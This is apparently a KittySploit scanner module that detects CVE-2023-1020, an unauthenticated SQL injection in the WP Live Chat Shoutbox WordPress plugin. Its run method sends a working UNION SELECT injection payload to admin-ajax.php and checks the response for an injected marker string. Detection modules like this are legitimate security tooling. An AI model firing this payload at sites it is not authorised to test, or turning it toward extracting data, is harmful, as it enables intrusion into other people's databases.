#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Steveas WP Live Chat Shoutbox WordPress plugin through 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Steveas WP Live Chat Shoutbox <= 1.4.2 - SQL Injection Detection',
        'description': 'The Steveas WP Live Chat Shoutbox WordPress plugin through 1.4.2 does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to a SQL injection.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web',
            'scanner',
            'cve2023',
            'cve',
            'wpscan',
            'sqli',
            'wordpress',
            'wp-plugin',
            'wp',
            'wp-shoutbox-live-chat',
            'wp_live_chat_shoutbox_project',
            'vkev',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/4e5aa9a3-65a0-47d6-bc26-a2fb6cb073ff',
            'https://wordpress.org/plugins/wp-shoutbox-live-chat/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-1020',
        ],
        'cve': 'CVE-2023-1020',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='action=shoutbox-ajax-update-messages&last_timestamp=0)+UNION+ALL+SELECT+NULL,NULL,(SELECT+CONCAT(0x6338633630353939396633643833353264376262373932636633666462323562)),NULL,NULL,NULL,NULL,NULL--+&rooms%5B%5D=default\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('c8c605999f3d8352d7bb792cf3fdb25b', 'no_participation',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Steveas WP Live Chat Shoutbox <= 1.4.2 - SQL Injection detected', path=path)
            return True
        return False

